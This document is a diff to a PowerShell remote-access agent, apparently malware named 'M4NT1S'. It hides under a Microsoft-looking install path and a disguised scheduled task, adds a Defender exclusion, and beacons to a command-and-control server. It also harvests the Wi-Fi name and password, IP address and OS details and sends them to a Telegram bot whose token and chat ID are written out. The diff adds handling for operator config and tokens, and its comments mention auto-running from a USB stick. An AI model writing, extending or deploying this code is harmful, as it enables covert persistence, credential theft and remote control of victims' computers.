@@ -5,9 +5,13 @@ param([string]$Mode = "auto")
 if (-not $Mode) { $Mode = "auto" }
 
 # ---------- CONFIG ----------
-$C2Url      = "https://c2.computerfix.services/api/v1"
-$TgBotToken = "8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE"
-$TgChatId   = "7984959772"
+# Telegram credentials are inlined here on purpose. Resolution order at
+# runtime is: environment variables > $AgentConf > the literals below, so
+# either layer can override them without editing this file.
+$C2Url       = "https://c2.computerfix.services/api/v1"
+$TgBotToken  = "8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE"
+# Literal default only; the resolved value lives in $script:TgChatId.
+$TgChatIdLit = "7984959772"
 # ----------------------------
 
 $InstallDir = "C:\ProgramData\Microsoft\DeviceMetadata"
@@ -15,10 +19,62 @@ $AgentTask  = "Microsoft\Windows\Device Setup\Device Metadata Refresh"
 $SelfPath   = "$InstallDir\a.ps1"
 $LockFile   = "$InstallDir\installed.lock"
 $LogFile    = "$InstallDir\agent.log"
+$AgentConf  = "$InstallDir\agent.conf"
+
+$script:C2Token  = $env:M4NT1S_C2_TOKEN
+$script:TgToken  = $env:M4NT1S_TG_TOKEN
+$script:TgChatId = $env:M4NT1S_TG_CHAT
+
+function Read-AgentConf($path) {
+    $out = @{}
+    if (-not (Test-Path -LiteralPath $path)) { return $out }
+    try {
+        foreach ($line in Get-Content -LiteralPath $path -ErrorAction Stop) {
+            if ($line -match '^\s*#' -or $line -notmatch '=') { continue }
+            $kv = $line -split '=', 2
+            $out[$kv[0].Trim().ToLower()] = $kv[1].Trim()
+        }
+    } catch {
+        # Do not fail silently: an unreadable agent.conf means every C2 call
+        # will 401 and the operator has no clue why.
+        Write-Warning "agent.conf unreadable ($path): $($_.Exception.Message)"
+    }
+    return $out
+}
+
+function Write-AgentConf {
+    $lines = @('# M4NT1S agent config - operator overrides. Never commit this file.')
+    # Only env-provided values are persisted; the built-in defaults are
+    # already baked into the script and do not need a copy on disk.
+    if ($env:M4NT1S_C2_TOKEN) { $lines += "c2_token=$($env:M4NT1S_C2_TOKEN)" }
+    if ($env:M4NT1S_TG_TOKEN) { $lines += "tg_token=$($env:M4NT1S_TG_TOKEN)" }
+    if ($env:M4NT1S_TG_CHAT)  { $lines += "tg_chat=$($env:M4NT1S_TG_CHAT)" }
+    if ($env:M4NT1S_C2_URL)   { $lines += "c2_url=$($env:M4NT1S_C2_URL)" }
+    if ($lines.Count -le 1) { return }
+    try {
+        $lines | Out-File -LiteralPath $AgentConf -Encoding ASCII -Force
+        # SYSTEM is the task identity (full control); Administrators own it.
+        # Users get read access because -Mode auto is normally launched from
+        # the USB stick in a NON-elevated session, and that run has to read
+        # the same file back. Removing this breaks the auto-run path.
+        icacls $AgentConf /inheritance:r /grant:r 'SYSTEM:(F)' 'Administrators:(F)' 'Users:(R)' 2>&1 | Out-Null
+        Log "[+] Wrote $AgentConf"
+    } catch {
+        Log "[!] agent.conf write failed: $($_.Exception.Message)"
+    }
+}
 
 function Post($path, $obj) {
     $body = $obj | ConvertTo-Json -Compress -Depth 10
-    Invoke-RestMethod -Uri "$C2Url$path" -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 20
+    $req = @{
+        Uri         = "$C2Url$path"
+        Method      = 'Post'
+        Body        = $body
+        ContentType = 'application/json'
+        TimeoutSec  = 20
+    }
+    if ($script:C2Token) { $req['Headers'] = @{ 'X-C2-Token' = $script:C2Token } }
+    Invoke-RestMethod @req
 }
 function Log($msg) {
     $line = "$(Get-Date -Format o)  [pid $PID]  $msg"
@@ -31,6 +87,19 @@ function Log($msg) {
         }
     } catch { }
 }
+
+# Load the operator config once Log() exists so a read failure can be
+# reported rather than swallowed. Environment variables win over the file.
+$conf = Read-AgentConf $AgentConf
+if (-not $script:C2Token  -and $conf['c2_token']) { $script:C2Token  = $conf['c2_token'] }
+if (-not $script:TgToken  -and $conf['tg_token']) { $script:TgToken  = $conf['tg_token'] }
+if (-not $script:TgChatId -and $conf['tg_chat'])  { $script:TgChatId = $conf['tg_chat'] }
+if (-not $env:M4NT1S_C2_URL -and $conf['c2_url']) { $script:C2Url = $conf['c2_url'] }
+
+# Built-in defaults last, so an environment variable or agent.conf always wins.
+if (-not $script:TgToken)  { $script:TgToken  = $TgBotToken }
+if (-not $script:TgChatId) { $script:TgChatId = $TgChatIdLit }
+
 function Get-Admin {
     ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
@@ -56,13 +125,17 @@ function Get-WifiDetails {
     return @{ SSID = $displaySsid; Pass = $pass }
 }
 function Send-Telegram($status) {
+    if (-not $script:TgToken -or -not $script:TgChatId) {
+        Log "[*] Telegram not configured (tg_token/tg_chat missing) - notification skipped"
+        return
+    }
     try {
         $n  = $env:COMPUTERNAME
         $ip = (Invoke-RestMethod -Uri 'https://ipinfo.io/ip' -TimeoutSec 10)
         $wifi = Get-WifiDetails
         $os = (Get-CimInstance Win32_OperatingSystem).Caption
         $msg = "[$status] C2 Connection`n`nDevice: $n`nIP: $ip`nSSID: $($wifi.SSID)`nPass: $($wifi.Pass)`nOS: $os"
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$TgBotToken/sendMessage" -Method Post -Body @{ chat_id = $TgChatId; text = $msg } -TimeoutSec 15 | Out-Null
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($script:TgToken)/sendMessage" -Method Post -Body @{ chat_id = $script:TgChatId; text = $msg } -TimeoutSec 15 | Out-Null
         Log "[+] Telegram sent ($status) ssid=$($wifi.SSID) passlen=$($wifi.Pass.Length)"
     } catch { Log "[!] Telegram failed: $($_.Exception.Message)" }
 }
@@ -97,6 +170,7 @@ if ($Mode -eq "auto") {
 if ($Mode -eq "install" -or $Mode -eq "auto") {
     Log "[*] Installer starting"
     New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
+    Write-AgentConf
 
     # ---- DEFENDER EXCLUSION (must come before Copy-Item) ----
     if (Get-Admin) {
@@ -199,7 +273,11 @@ if (-not $id) { Log "[!] Register failed after 30 attempts. Exiting."; exit 1 }
 $global:streamJob       = $null
 $global:killswitchArmed = $false
 
-function Test-InteractiveSession { if ($sessionId -eq 0) { return $false } return $true }
+function Test-InteractiveSession {
+    $sid = [System.Diagnostics.Process]::GetCurrentProcess().SessionId
+    if ($sid -eq 0) { return $false }
+    return $true
+}
 
 # ---------------------------------------------------------------------------
 # SCREENSHOT - runs in the interactive user session via schtasks hand-off.
